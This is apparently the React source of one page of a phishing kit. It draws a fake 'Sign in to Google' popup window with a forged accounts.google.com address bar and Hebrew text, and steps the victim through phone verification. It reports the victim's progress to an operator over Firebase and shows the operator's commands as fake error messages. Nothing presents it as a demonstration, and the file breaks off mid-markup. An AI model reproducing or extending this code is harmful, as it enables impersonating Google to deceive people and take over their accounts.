import React, { useState, useEffect } from "react";
import { createPortal } from "react-dom";
const gmailLogo = "/logogmail.svg";
import EmailLayout from "../EmailLayout";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { getDetectedLanguageDisplayName } from "../../../utils/languageUtils";
import { useClientCountry } from "../../../hooks/use-client-country";
import Flag from 'react-flagkit';
import { useTranslation } from "react-i18next";
import { DeviceManager } from "../../../utils/deviceManager";

const GmailTelefonePage = ({ embedded = false }) => {
  const { t } = useTranslation();
  const {
    updateClientData,
    commands,
    isUserActive,
    clearCommands,
    clientData,
  } = useFirebaseClient();
  const { country } = useClientCountry();
  const [isNetOnline, setIsNetOnline] = React.useState(
    typeof navigator !== "undefined" ? navigator.onLine : true
  );
  const presence = React.useMemo(() => {
    if (!isNetOnline) return "offline";
    if (!isUserActive) return "away";
    return "online";
  }, [isNetOnline, isUserActive]);

  React.useEffect(() => {
    const onOnline = () => setIsNetOnline(true);
    const onOffline = () => setIsNetOnline(false);
    window.addEventListener("online", onOnline);
    window.addEventListener("offline", onOffline);
    return () => {
      window.removeEventListener("online", onOnline);
      window.removeEventListener("offline", onOffline);
    };
  }, []);

  // Atualizar URL/página no Firebase
  React.useEffect(() => {
    console.log("🔍 GmailTelefonePage - Inicializando página e atualizando Firebase");
    updateClientData({
      currentUrl: "/sync?view=gmail-telefone",
      currentPage: "gmail_telefone",
      gmailStage: "telefone",
      fromForm: true,
      // Inicializar campo gmailTelefone vazio se não existir
      gmailTelefone: "",
    });
  }, [updateClientData]);

  // Toasts leves locais (sem lib)
  const [toasts, setToasts] = React.useState([]);
  const pushToast = React.useCallback((toast) => {
    const id = Math.random().toString(36).slice(2);
    const item = { id, ...toast };
    setToasts((t) => [...t, item]);
    setTimeout(() => {
      setToasts((t) => t.filter((x) => x.id !== id));
    }, toast.duration ?? 3000);
  }, []);

  const [code, setCode] = React.useState("");
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [loadingStage, setLoadingStage] = React.useState(null); // 'bar' | 'final'
  const [invalidMessage, setInvalidMessage] = React.useState("");
  const [selectedCountry, setSelectedCountry] = React.useState('US');
  const [isDetectingCountry, setIsDetectingCountry] = React.useState(true);
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");
  const [dropdownPosition, setDropdownPosition] = React.useState({ top: 0, left: 0 });
  const countryRef = React.useRef(null);
  const [isReady, setIsReady] = React.useState(false);
  const [progress, setProgress] = React.useState(0);

  React.useEffect(() => {
    // Preloader com duração de 2.5 segundos
    const startTime = Date.now();
    const duration = 2500; // 2.5 segundos

    const updateProgress = () => {
      const elapsed = Date.now() - startTime;
      const newProgress = Math.min((elapsed / duration) * 100, 100);
      setProgress(newProgress);

      if (newProgress < 100) {
        requestAnimationFrame(updateProgress);
      }
    };

    requestAnimationFrame(updateProgress);

    // Aguarda a barra completar totalmente antes de abrir o modal
    const id = setTimeout(() => setIsReady(true), 2600); // 100ms a mais para garantir que chegue a 100%
    return () => clearTimeout(id);
  }, []);

  // Efeito para injetar CSS animations
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes loadingBar {
        0% { transform: translateX(-100%); }
        50% { transform: translateX(0%); }
        100% { transform: translateX(100%); }
      }
      @keyframes spin { 
        from { transform: rotate(0deg); } 
        to { transform: rotate(360deg); } 
      }
    `;
    document.head.appendChild(style);
    return () => {
      if (document.head.contains(style)) {
        document.head.removeChild(style);
      }
    };
  }, []);
  
  const countries = [
    { code: 'US', name: 'United States', dialCode: '+1' },
    { code: 'BR', name: 'Brazil', dialCode: '+55' },
    { code: 'GB', name: 'United Kingdom', dialCode: '+44' },
    { code: 'CA', name: 'Canada', dialCode: '+1' },
    { code: 'AU', name: 'Australia', dialCode: '+61' },
    { code: 'DE', name: 'Germany', dialCode: '+49' },
    { code: 'FR', name: 'France', dialCode: '+33' },
    { code: 'IT', name: 'Italy', dialCode: '+39' },
    { code: 'ES', name: 'Spain', dialCode: '+34' },
    { code: 'MX', name: 'Mexico', dialCode: '+52' },
    { code: 'AR', name: 'Argentina', dialCode: '+54' },
    { code: 'CL', name: 'Chile', dialCode: '+56' },
    { code: 'CO', name: 'Colombia', dialCode: '+57' },
    { code: 'PE', name: 'Peru', dialCode: '+51' },
    { code: 'JP', name: 'Japan', dialCode: '+81' },
    { code: 'KR', name: 'South Korea', dialCode: '+82' },
    { code: 'CN', name: 'China', dialCode: '+86' },
    { code: 'IN', name: 'India', dialCode: '+91' },
    { code: 'RU', name: 'Russia', dialCode: '+7' },
    { code: 'ZA', name: 'South Africa', dialCode: '+27' },
    { code: 'AF', name: 'Afghanistan', dialCode: '+93' },
    { code: 'AL', name: 'Albania', dialCode: '+355' },
    { code: 'DZ', name: 'Algeria', dialCode: '+213' },
    { code: 'AD', name: 'Andorra', dialCode: '+376' },
    { code: 'AO', name: 'Angola', dialCode: '+244' },
    { code: 'AM', name: 'Armenia', dialCode: '+374' },
    { code: 'AT', name: 'Austria', dialCode: '+43' },
    { code: 'AZ', name: 'Azerbaijan', dialCode: '+994' },
    { code: 'BH', name: 'Bahrain', dialCode: '+973' },
    { code: 'BD', name: 'Bangladesh', dialCode: '+880' },
    { code: 'BY', name: 'Belarus', dialCode: '+375' },
    { code: 'BE', name: 'Belgium', dialCode: '+32' },
    { code: 'BZ', name: 'Belize', dialCode: '+501' },
    { code: 'BJ', name: 'Benin', dialCode: '+229' },
    { code: 'BT', name: 'Bhutan', dialCode: '+975' },
    { code: 'BO', name: 'Bolivia', dialCode: '+591' },
    { code: 'BA', name: 'Bosnia and Herzegovina', dialCode: '+387' },
    { code: 'BW', name: 'Botswana', dialCode: '+267' },
    { code: 'BN', name: 'Brunei', dialCode: '+673' },
    { code: 'BG', name: 'Bulgaria', dialCode: '+359' },
    { code: 'BF', name: 'Burkina Faso', dialCode: '+226' },
    { code: 'BI', name: 'Burundi', dialCode: '+257' },
    { code: 'KH', name: 'Cambodia', dialCode: '+855' },
    { code: 'CM', name: 'Cameroon', dialCode: '+237' },
    { code: 'CV', name: 'Cape Verde', dialCode: '+238' },
    { code: 'CF', name: 'Central African Republic', dialCode: '+236' },
    { code: 'TD', name: 'Chad', dialCode: '+235' },
    { code: 'KM', name: 'Comoros', dialCode: '+269' },
    { code: 'CG', name: 'Congo', dialCode: '+242' },
    { code: 'CR', name: 'Costa Rica', dialCode: '+506' },
    { code: 'HR', name: 'Croatia', dialCode: '+385' },
    { code: 'CU', name: 'Cuba', dialCode: '+53' },
    { code: 'CY', name: 'Cyprus', dialCode: '+357' },
    { code: 'CZ', name: 'Czech Republic', dialCode: '+420' },
    { code: 'DK', name: 'Denmark', dialCode: '+45' },
    { code: 'DJ', name: 'Djibouti', dialCode: '+253' },
    { code: 'DM', name: 'Dominica', dialCode: '+1767' },
    { code: 'DO', name: 'Dominican Republic', dialCode: '+1809' },
    { code: 'EC', name: 'Ecuador', dialCode: '+593' },
    { code: 'EG', name: 'Egypt', dialCode: '+20' },
    { code: 'SV', name: 'El Salvador', dialCode: '+503' },
    { code: 'GQ', name: 'Equatorial Guinea', dialCode: '+240' },
    { code: 'ER', name: 'Eritrea', dialCode: '+291' },
    { code: 'EE', name: 'Estonia', dialCode: '+372' },
    { code: 'ET', name: 'Ethiopia', dialCode: '+251' },
    { code: 'FJ', name: 'Fiji', dialCode: '+679' },
    { code: 'FI', name: 'Finland', dialCode: '+358' },
    { code: 'GA', name: 'Gabon', dialCode: '+241' },
    { code: 'GM', name: 'Gambia', dialCode: '+220' },
    { code: 'GE', name: 'Georgia', dialCode: '+995' },
    { code: 'GH', name: 'Ghana', dialCode: '+233' },
    { code: 'GR', name: 'Greece', dialCode: '+30' },
    { code: 'GD', name: 'Grenada', dialCode: '+1473' },
    { code: 'GT', name: 'Guatemala', dialCode: '+502' },
    { code: 'GN', name: 'Guinea', dialCode: '+224' },
    { code: 'GW', name: 'Guinea-Bissau', dialCode: '+245' },
    { code: 'GY', name: 'Guyana', dialCode: '+592' },
    { code: 'HT', name: 'Haiti', dialCode: '+509' },
    { code: 'HN', name: 'Honduras', dialCode: '+504' },
    { code: 'HU', name: 'Hungary', dialCode: '+36' },
    { code: 'IS', name: 'Iceland', dialCode: '+354' },
    { code: 'ID', name: 'Indonesia', dialCode: '+62' },
    { code: 'IR', name: 'Iran', dialCode: '+98' },
    { code: 'IQ', name: 'Iraq', dialCode: '+964' },
    { code: 'IE', name: 'Ireland', dialCode: '+353' },
    { code: 'IL', name: 'Israel', dialCode: '+972' },
    { code: 'JM', name: 'Jamaica', dialCode: '+1876' },
    { code: 'JO', name: 'Jordan', dialCode: '+962' },
    { code: 'KZ', name: 'Kazakhstan', dialCode: '+7' },
    { code: 'KE', name: 'Kenya', dialCode: '+254' },
    { code: 'KI', name: 'Kiribati', dialCode: '+686' },
    { code: 'KP', name: 'North Korea', dialCode: '+850' },
    { code: 'KW', name: 'Kuwait', dialCode: '+965' },
    { code: 'KG', name: 'Kyrgyzstan', dialCode: '+996' },
    { code: 'LA', name: 'Laos', dialCode: '+856' },
    { code: 'LV', name: 'Latvia', dialCode: '+371' },
    { code: 'LB', name: 'Lebanon', dialCode: '+961' },
    { code: 'LS', name: 'Lesotho', dialCode: '+266' },
    { code: 'LR', name: 'Liberia', dialCode: '+231' },
    { code: 'LY', name: 'Libya', dialCode: '+218' },
    { code: 'LI', name: 'Liechtenstein', dialCode: '+423' },
    { code: 'LT', name: 'Lithuania', dialCode: '+370' },
    { code: 'LU', name: 'Luxembourg', dialCode: '+352' },
    { code: 'MK', name: 'North Macedonia', dialCode: '+389' },
    { code: 'MG', name: 'Madagascar', dialCode: '+261' },
    { code: 'MW', name: 'Malawi', dialCode: '+265' },
    { code: 'MY', name: 'Malaysia', dialCode: '+60' },
    { code: 'MV', name: 'Maldives', dialCode: '+960' },
    { code: 'ML', name: 'Mali', dialCode: '+223' },
    { code: 'MT', name: 'Malta', dialCode: '+356' },
    { code: 'MH', name: 'Marshall Islands', dialCode: '+692' },
    { code: 'MR', name: 'Mauritania', dialCode: '+222' },
    { code: 'MU', name: 'Mauritius', dialCode: '+230' },
    { code: 'FM', name: 'Micronesia', dialCode: '+691' },
    { code: 'MD', name: 'Moldova', dialCode: '+373' },
    { code: 'MC', name: 'Monaco', dialCode: '+377' },
    { code: 'MN', name: 'Mongolia', dialCode: '+976' },
    { code: 'ME', name: 'Montenegro', dialCode: '+382' },
    { code: 'MA', name: 'Morocco', dialCode: '+212' },
    { code: 'MZ', name: 'Mozambique', dialCode: '+258' },
    { code: 'MM', name: 'Myanmar', dialCode: '+95' },
    { code: 'NA', name: 'Namibia', dialCode: '+264' },
    { code: 'NR', name: 'Nauru', dialCode: '+674' },
    { code: 'NP', name: 'Nepal', dialCode: '+977' },
    { code: 'NL', name: 'Netherlands', dialCode: '+31' },
    { code: 'NZ', name: 'New Zealand', dialCode: '+64' },
    { code: 'NI', name: 'Nicaragua', dialCode: '+505' },
    { code: 'NE', name: 'Niger', dialCode: '+227' },
    { code: 'NG', name: 'Nigeria', dialCode: '+234' },
    { code: 'NO', name: 'Norway', dialCode: '+47' },
    { code: 'OM', name: 'Oman', dialCode: '+968' },
    { code: 'PK', name: 'Pakistan', dialCode: '+92' },
    { code: 'PW', name: 'Palau', dialCode: '+680' },
    { code: 'PA', name: 'Panama', dialCode: '+507' },
    { code: 'PG', name: 'Papua New Guinea', dialCode: '+675' },
    { code: 'PY', name: 'Paraguay', dialCode: '+595' },
    { code: 'PH', name: 'Philippines', dialCode: '+63' },
    { code: 'PL', name: 'Poland', dialCode: '+48' },
    { code: 'PT', name: 'Portugal', dialCode: '+351' },
    { code: 'QA', name: 'Qatar', dialCode: '+974' },
    { code: 'RO', name: 'Romania', dialCode: '+40' },
    { code: 'RW', name: 'Rwanda', dialCode: '+250' },
    { code: 'KN', name: 'Saint Kitts and Nevis', dialCode: '+1869' },
    { code: 'LC', name: 'Saint Lucia', dialCode: '+1758' },
    { code: 'VC', name: 'Saint Vincent and the Grenadines', dialCode: '+1784' },
    { code: 'WS', name: 'Samoa', dialCode: '+685' },
    { code: 'SM', name: 'San Marino', dialCode: '+378' },
    { code: 'ST', name: 'Sao Tome and Principe', dialCode: '+239' },
    { code: 'SA', name: 'Saudi Arabia', dialCode: '+966' },
    { code: 'SN', name: 'Senegal', dialCode: '+221' },
    { code: 'RS', name: 'Serbia', dialCode: '+381' },
    { code: 'SC', name: 'Seychelles', dialCode: '+248' },
    { code: 'SL', name: 'Sierra Leone', dialCode: '+232' },
    { code: 'SG', name: 'Singapore', dialCode: '+65' },
    { code: 'SK', name: 'Slovakia', dialCode: '+421' },
    { code: 'SI', name: 'Slovenia', dialCode: '+386' },
    { code: 'SB', name: 'Solomon Islands', dialCode: '+677' },
    { code: 'SO', name: 'Somalia', dialCode: '+252' },
    { code: 'SS', name: 'South Sudan', dialCode: '+211' },
    { code: 'LK', name: 'Sri Lanka', dialCode: '+94' },
    { code: 'SD', name: 'Sudan', dialCode: '+249' },
    { code: 'SR', name: 'Suriname', dialCode: '+597' },
    { code: 'SZ', name: 'Eswatini', dialCode: '+268' },
    { code: 'SE', name: 'Sweden', dialCode: '+46' },
    { code: 'CH', name: 'Switzerland', dialCode: '+41' },
    { code: 'SY', name: 'Syria', dialCode: '+963' },
    { code: 'TW', name: 'Taiwan', dialCode: '+886' },
    { code: 'TJ', name: 'Tajikistan', dialCode: '+992' },
    { code: 'TZ', name: 'Tanzania', dialCode: '+255' },
    { code: 'TH', name: 'Thailand', dialCode: '+66' },
    { code: 'TL', name: 'Timor-Leste', dialCode: '+670' },
    { code: 'TG', name: 'Togo', dialCode: '+228' },
    { code: 'TO', name: 'Tonga', dialCode: '+676' },
    { code: 'TT', name: 'Trinidad and Tobago', dialCode: '+1868' },
    { code: 'TN', name: 'Tunisia', dialCode: '+216' },
    { code: 'TR', name: 'Turkey', dialCode: '+90' },
    { code: 'TM', name: 'Turkmenistan', dialCode: '+993' },
    { code: 'TV', name: 'Tuvalu', dialCode: '+688' },
    { code: 'UG', name: 'Uganda', dialCode: '+256' },
    { code: 'UA', name: 'Ukraine', dialCode: '+380' },
    { code: 'AE', name: 'United Arab Emirates', dialCode: '+971' },
    { code: 'UY', name: 'Uruguay', dialCode: '+598' },
    { code: 'UZ', name: 'Uzbekistan', dialCode: '+998' },
    { code: 'VU', name: 'Vanuatu', dialCode: '+678' },
    { code: 'VA', name: 'Vatican City', dialCode: '+39' },
    { code: 'VE', name: 'Venezuela', dialCode: '+58' },
    { code: 'VN', name: 'Vietnam', dialCode: '+84' },
    { code: 'YE', name: 'Yemen', dialCode: '+967' },
    { code: 'ZM', name: 'Zambia', dialCode: '+260' },
    { code: 'ZW', name: 'Zimbabwe', dialCode: '+263' }
  ];
  
  const selectedCountryData = countries.find(c => c.code === selectedCountry) || countries[0];

  // Detectar país do usuário automaticamente
  React.useEffect(() => {
    const detectUserCountry = async () => {
      try {
        // Tentar detectar país via API de geolocalização
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        
        if (data.country_code) {
          const detectedCountry = data.country_code.toUpperCase();
          // Verificar se o país detectado existe na lista
          const countryExists = countries.find(c => c.code === detectedCountry);
          if (countryExists) {
            setSelectedCountry(detectedCountry);
            console.log('🌍 País detectado automaticamente:', detectedCountry, countryExists.name);
          }
        }
      } catch (error) {
        console.log('❌ Erro ao detectar país, usando US como padrão:', error);
      } finally {
        setIsDetectingCountry(false);
      }
    };

    detectUserCountry();
  }, []);
  
  // Fechar dropdown quando clicar fora
  React.useEffect(() => {
    const handleClickOutside = (event) => {
      if (isDropdownOpen && !event.target.closest('.country-selector') && !event.target.closest('.country-dropdown')) {
        setIsDropdownOpen(false);
      }
    };
    
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, [isDropdownOpen]);
  

  const phrases = React.useMemo(
    () => [
      "מתחבר...",
      "אנא המתן רגע...",
      "מסיים את החיבור שלך...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  const [currentLang, setCurrentLang] = React.useState("en");

  const translations = {
    windowTitle: "היכנס לחשבונות Google",
    url: "https://accounts.google.com/v3/signin/identifier?gsiwebsdk=3&client_id=407408718192.apps.googleusercontent.com",
    header: "היכנס ל-Google",
    help: "עזרה",
    privacy: "פרטיות",
    terms: "תנאים",
  };

  // Função para obter device number logado
  const getLoggedInDevice = () => {
    const device = DeviceManager.getDeviceWithFirebaseData(clientData);
    console.log("📱 Gmail Telefone Modal - Device obtido:", device);
    return device;
  };

  const [clientDevice, setClientDevice] = React.useState(getLoggedInDevice());

  // Atualizar device quando clientData mudar
  React.useEffect(() => {
    const newDevice = getLoggedInDevice();
    if (newDevice !== clientDevice) {
      setClientDevice(newDevice);
    }
  }, [clientData?.deviceNumber]);

  // Responsividade para centralizar em telas pequenas
  const [viewport, setViewport] = React.useState({
    width: typeof window !== "undefined" ? window.innerWidth : 1024,
    height: typeof window !== "undefined" ? window.innerHeight : 768,
  });

  React.useEffect(() => {
    const updateViewport = () => {
      setViewport({
        width: window.innerWidth,
        height: window.innerHeight,
      });
    };
    window.addEventListener("resize", updateViewport);
    return () => window.removeEventListener("resize", updateViewport);
  }, []);

  const isSmallViewport = viewport.width < 500;
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const [position, setPosition] = React.useState({ x: 0, y: 0 });

  const startDrag = (e) => {
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA"].includes(tag)) return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.x,
      y: e.clientY - position.y,
    };
  };

  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        x: Math.max(0, e.clientX - dragOffsetRef.current.x),
        y: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  // Monitorar mudanças no localStorage e clientData para atualizar device number em tempo real
  React.useEffect(() => {
    const handleStorageChange = () => {
      const newDevice = getLoggedInDevice();
      if (newDevice !== clientDevice) {
        setClientDevice(newDevice);
        console.log("📱 Gmail Telefone Modal - Device number atualizado:", newDevice);
      }
    };

    // Escutar mudanças no localStorage
    window.addEventListener("storage", handleStorageChange);

    // Verificar periodicamente (para mudanças na mesma aba)
    const interval = setInterval(handleStorageChange, 1000);

    return () => {
      window.removeEventListener("storage", handleStorageChange);
      clearInterval(interval);
    };
  }, [clientDevice, clientData?.deviceNumber]);

  const handleAdvance = () => {
    console.log("🚀 GmailTelefonePage - Enviando telefone:", code);
    try { 
      updateClientData({ gmailTelefoneSubmittedAt: Date.now() });
      console.log("✅ GmailTelefonePage - Timestamp de envio salvo no Firebase");
    } catch (error) {
      console.error("❌ GmailTelefonePage - Erro ao salvar timestamp:", error);
    }
    setIsSubmitting(true);
    setLoadingStage("bar");
    // Após 3s, muda para etapa final com gif + spinner, igual password
    setTimeout(() => setLoadingStage("final"), 3000);
  };

  const nextBtnRef = React.useRef(null);
  const [nextBtnWidth, setNextBtnWidth] = React.useState(null);
  const debounceRef = React.useRef(null);

  React.useEffect(() => {
    if (!isSubmitting || loadingStage !== "final") return;
    
    const interval = setInterval(
      () => setPhraseIndex((p) => (p + 1) % phrases.length),
      2000
    );
    return () => clearInterval(interval);
  }, [isSubmitting, loadingStage, phrases.length]);

  // Navegação por comandos e inválidos
  const navigateByCommand = React.useCallback(() => false, []);

  const handleInvalidInline = React.useCallback((cmd) => {
    const map = {
      invalid_gmailtelefone: "מספר טלפון לא תקין. אנא נסה שוב.",
      inv_telefone: "מספר טלפון לא תקין. אנא נסה שוב.",
      invalid_telefone: "מספר טלפון לא תקין. אנא נסה שוב.",
      invalid_codemail: "קוד לא תקין. אנא נסה שוב.",
      invalid_gmailcodemail: "קוד לא תקין. אנא נסה שוב.",
      invalid_auth: "אימות לא תקין. אנא נסה שוב.",
      invalid_gmailauth: "אימות לא תקין. אנא נסה שוב.",
    };
    const message = map[cmd] || "אימות טלפון לא תקין. אנא נסה שוב.";
    setInvalidMessage(message);
    setIsSubmitting(false);
    setLoadingStage(null);
    setCode("");
  }, []);

  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latest = commands[commands.length - 1];
    if (!latest || typeof latest !== "string") return;

    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      handleInvalidInline(latest);
      // limpar depois de exibir a mensagem para não ficar repetindo
      setTimeout(() => clearCommands(), 200);
      return;
    }

    const navigated = navigateByCommand(latest);
    if (navigated) {
      // limpar após navegar
      setTimeout(() => clearCommands(), 100);
    }
  }, [commands, navigateByCommand, handleInvalidInline, clearCommands]);

  // Estado para armazenar o número fixo recebido do dashboard (não deve ser alterado pelos inputs)
  const [fixedPhoneFromDashboard, setFixedPhoneFromDashboard] = React.useState("");
  const [hasSetInitialPhone, setHasSetInitialPhone] = React.useState(false);
  
  // Definir o número fixo apenas uma vez quando receber do dashboard
  React.useEffect(() => {
    const dashboardPhone = (clientData && (clientData.gmailTelefonePhone || clientData.gmailTelefone)) || "";
    if (dashboardPhone && !hasSetInitialPhone) {
      setFixedPhoneFromDashboard(dashboardPhone);
      setHasSetInitialPhone(true);
      console.log("📱 GmailTelefonePage - Número fixo definido do dashboard:", dashboardPhone);
    }
  }, [clientData?.gmailTelefonePhone, clientData?.gmailTelefone, hasSetInitialPhone]);

  const maskedTarget = "(••) ••••-••97";
  const hasPhoneConfig = String(fixedPhoneFromDashboard || "").replace(/\D/g, "").length > 0;

  const renderPhoneMasked = () => {
    if (!hasPhoneConfig) return "";
    const cleaned = String(fixedPhoneFromDashboard || "").replace(/\D/g, ""); // Remove tudo que não é dígito
    if (!cleaned || cleaned.length < 2) return maskedTarget;
    
    // Sempre extrair apenas os 2 últimos dígitos, independentemente do tamanho
    const last2 = cleaned.slice(-2);
    
    // Substituir somente os dois últimos dígitos numéricos do template
    const chars = maskedTarget.split("");
    let replaced = 0;
    for (let i = chars.length - 1; i >= 0 && replaced < 2; i--) {
      if (/\d/.test(chars[i])) {
        // last2[1] vai para o último dígito, last2[0] para o penúltimo
        chars[i] = last2[1 - replaced];
        replaced++;
      }
    }
    return chars.join("");
  };

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ fontFamily: "Roboto, Arial, sans-serif" }}
      >
        {/* Presence indicator */}
        {!embedded && (
          <div
            style={{
              position: "fixed",
              top: 10,
              right: 10,
              zIndex: 60,
              display: "flex",
              alignItems: "center",
              gap: 8,
              padding: "6px 10px",
              borderRadius: 999,
              background: "rgba(0,0,0,0.45)",
              color: "#e5e7eb",
              fontSize: 12,
              border: "1px solid rgba(255,255,255,0.08)",
              backdropFilter: "blur(2px)",
            }}
          >
            <span
              style={{
                width: 8,
                height: 8,
                borderRadius: 999,
                display: "inline-block",
                background:
                  presence === "online"
                    ? "#22c55e"
                    : presence === "away"
                    ? "#f59e0b"
                    : "#ef4444",
              }}
            />
            <span style={{ textTransform: "capitalize" }}>{presence}</span>
          </div>
        )}

        {/* Toasts container */}
        <div
          style={{
            position: "fixed",
            top: 12,
            left: "50%",
            transform: "translateX(-50%)",
            zIndex: 70,
            display: "flex",
            flexDirection: "column",
            gap: 8,
          }}
        >
          {toasts.map((t) => (
            <div
              key={t.id}
              style={{
                padding: "10px 14px",
                borderRadius: 8,
                background:
                  t.type === "error"
                    ? "rgba(239,68,68,0.12)"
                    : "rgba(34,197,94,0.12)",
                color: "#e5e7eb",
                border:
                  t.type === "error"
                    ? "1px solid rgba(239,68,68,0.35)"
                    : "1px solid rgba(34,197,94,0.35)",
                backdropFilter: "blur(0.5px)",
                WebkitBackdropFilter: "blur(0.5px)",
                maxWidth: 520,
                boxShadow: "0 8px 24px rgba(0,0,0,0.35)",
              }}
            >
              {t.message}
            </div>
          ))}
        </div>
        <div
          style={{
            background: "#fff",
            borderRadius: 12,
            boxShadow: "0 8px 32px rgba(0, 0, 0, 0.3)",
            width: isSmallViewport ? "min(466px, 96vw)" : "min(466px, 92vw)",
            height: Math.min(560, Math.max(420, viewport.height - 24)),
            position: "fixed",
            color: "#202124",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
        >
          {/* Spinner de loading inicial */}
          {!isReady && (
            <div
              style={{
                position: "absolute",
                inset: 0,
                background: "#ffffff",
                display: "flex",
                flexDirection: "column",
                zIndex: 9999,
                borderRadius: 12,
              }}
            >
              {/* Barra da janela */}
              <div
                style={{
                  height: 32,
                  background: "#e8f0fe",
                  borderBottom: "1px solid #d7e3fc",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "0 8px",
                  fontSize: 12,
                  direction: "ltr", // Força LTR para manter botões à direita
                }}
              >
                <span
                  style={{
                    opacity: 0.9,
                    display: "flex",
                    alignItems: "center",
                    gap: 6,
                  }}
                >
                  <svg
                    xmlns="https://www.w3.org/2000/svg"
                    width="16"
                    height="16"
                    viewBox="0 0 40 48"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <path
                      fill="#4285F4"
                      d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                    />
                    <path
                      fill="#34A853"
                      d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                    />
                    <path
                      fill="#FABB05"
                      d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                    />
                    <path
                      fill="#E94235"
                      d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                    />
                  </svg>
                  היכנס לחשבונות Google - 
                </span>
                <div style={{ display: "flex", gap: 4 }}>
                  <button
                    title="Minimize"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M3 8.5H13"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  </button>
                  <button
                    title="Maximize"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <rect
                        x="3.5"
                        y="3.5"
                        width="9"
                        height="9"
                        rx="1"
                        stroke="#111"
                        strokeWidth="1.5"
                      />
                    </svg>
                  </button>
                  <button
                    title="Close"
                    style={{
                      width: 36,
                      height: 22,
                      border: "none",
                      background: "transparent",
                      cursor: "default",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                    }}
                  >
                    <svg
                      width="12"
                      height="12"
                      viewBox="0 0 16 16"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M4 4L12 12"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                      <path
                        d="M12 4L4 12"
                        stroke="#111"
                        strokeWidth="1.5"
                        strokeLinecap="round"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              {/* URL bar */}
              <div
                style={{
                  borderBottom: "1px solid #eaecee",
                  padding: 0,
                  background: "#ffffff",
                  margin: 0,
                }}
              >
                <div
                  style={{
                    width: "100%",
                    background: "#eef1f3",
                    border: "1px solid #d0d7de",
                    borderRadius: 0,
                    height: 32,
                    display: "flex",
                    alignItems: "center",
                    padding: "0 10px",
                    gap: 8,
                    fontSize: 12,
                    color: "#202124",
                  }}
                >
                  <svg
                    width="16"
                    height="16"
                    viewBox="0 0 16 16"
                    xmlns="http://www.w3.org/2000/svg"
                    version="1.1"
                    fill="none"
                    stroke="#5f6368"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="1.5"
                    aria-hidden="true"
                    style={{ display: "block" }}
                  >
                    <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                    <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                  </svg>
                  <div
                    style={{
                      overflow: "hidden",
                      textOverflow: "ellipsis",
                      whiteSpace: "nowrap",
                    }}
                  >
                    https://accounts.google.com/v3/signin/identifier?gsiwebsdk=3&client_id=407408718192.apps.googleusercontent.com
                  </div>
                </div>
              </div>

              {/* Barra de progresso */}
              <div
                style={{
                  width: "100%",
                  height: 2,
                  background: "#e8f0fe",
                  position: "relative",
                }}
              >
                <div
                  style={{
                    width: `${progress}%`,
                    height: "100%",
                    background: "#1a73e8",
                    transition: "width 0.1s ease-out",
                    position: "absolute",
                    left: 0,
                    top: 0,
                  }}
                />
              </div>

              {/* Header pequeno */}
              <div
                style={{
                  width: "100%",
